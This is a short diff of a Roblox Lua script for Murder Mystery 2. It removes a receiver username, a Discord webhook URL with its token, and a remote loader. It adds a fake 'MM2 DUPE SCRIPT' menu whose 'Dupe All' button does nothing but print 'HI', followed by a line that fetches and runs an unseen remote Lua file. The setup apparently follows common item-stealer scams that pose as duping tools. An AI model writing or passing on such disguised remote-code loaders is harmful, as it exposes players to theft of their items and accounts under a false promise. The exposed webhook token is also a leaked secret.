@@ -1,5 +1,11 @@
-Username = "volentlc"
-Webhook = "https://discord.com/api/webhooks/1313596218760233000/gbK2se0kgYdZTAYdMfJ2pPfi53-8UIhID4vf2NlwPQhrY1Eb20bmoS3OTb2hzfltgS8n"
-selectedLoadingScreen = "Select 1 or 2" -- If you dont know whats that just skip that part
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
 
-loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
+local PhantomForcesWindow = Library:NewWindow("MM2 DUPE SCRIPT")
+
+local KillingCheats = PhantomForcesWindow:NewSection("OP DUPE")
+
+KillingCheats:CreateButton("Dupe All", function()
+print("HI")
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialHardHub/x/main/mm2OpDupe.lua"))()
